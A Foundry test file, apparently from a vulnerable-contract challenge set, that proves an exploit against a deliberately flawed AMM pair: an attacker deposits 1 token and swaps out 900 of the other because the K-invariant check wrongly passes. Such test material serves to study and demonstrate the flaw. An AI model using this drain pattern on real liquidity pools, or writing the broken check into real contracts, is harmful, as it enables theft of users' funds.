// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C08.sol";
contract C08Test is Test {
    TokenC08 t0; TokenC08 t1; PairC08 pair;
    address lp = makeAddr("lp"); address attacker = makeAddr("attacker");
    function setUp() public {
        t0 = new TokenC08("Token A", "TKA"); t1 = new TokenC08("Token B", "TKB");
        pair = new PairC08(t0, t1);
        t0.mint(lp, 1_000e18); t1.mint(lp, 1_000e18);
        vm.startPrank(lp); t0.transfer(address(pair), 1_000e18); t1.transfer(address(pair), 1_000e18); pair.mint(lp); vm.stopPrank();
        t0.mint(attacker, 1e18);
    }
    function test_exploit_brokenKInvariantAllowsDrain() public {
        vm.startPrank(attacker);
        t0.transfer(address(pair), 1e18);     // pay in 1 token0
        pair.swap(0, 900e18, attacker);       // take out 900 token1 — K-check wrongly passes
        vm.stopPrank();
        assertEq(t1.balanceOf(attacker), 900e18);
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        assertEq(r0, 1_001e18); assertEq(r1, 100e18);
    }
}
